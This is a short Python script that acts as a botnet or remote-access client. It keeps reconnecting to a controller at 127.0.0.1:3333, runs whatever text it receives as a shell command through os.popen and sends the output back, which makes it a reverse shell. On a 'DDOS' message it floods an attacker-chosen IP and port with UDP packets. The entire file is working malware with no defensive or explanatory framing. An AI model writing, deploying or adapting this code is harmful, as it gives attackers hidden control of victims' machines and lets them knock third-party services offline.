from socket import *
import os
import time

while True:
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(("127.0.0.1", 3333))

        while True:
            data = client.recv(2048).decode()
            if data == "exit":
                client.close()
                break
            if "DDOS" in data:
                parts = data.split(',')
                command, target_ip, target_port, num_packets = parts
                target_port = int(target_port)
                num_packets = int(num_packets)
                # Define the target IP address and port
                client_socket = socket(AF_INET, SOCK_DGRAM)
                # Define the packet data
                message = b"Network Testing"
                # Send the packets
                for _ in range(num_packets):
                    client_socket.sendto(message, (target_ip, target_port))
                client_socket.close()
                continue
            process = os.popen(data + " 2>&1")
            result = process.read()
            print(result)

            if "is not recognized" in result:
                error_message = f"Error: Command '{data}' is not recognized"
                client.sendall(error_message.encode())
                continue
            elif not result:
                result = f"Warning: Command '{data}' with no output"

            client.sendall(result.encode())
    except ConnectionError as e:
        print(f"Connection error: {e}")
        time.sleep(2)
    except Exception as e:
        print(f"An error occurred: {e}")
        time.sleep(2)
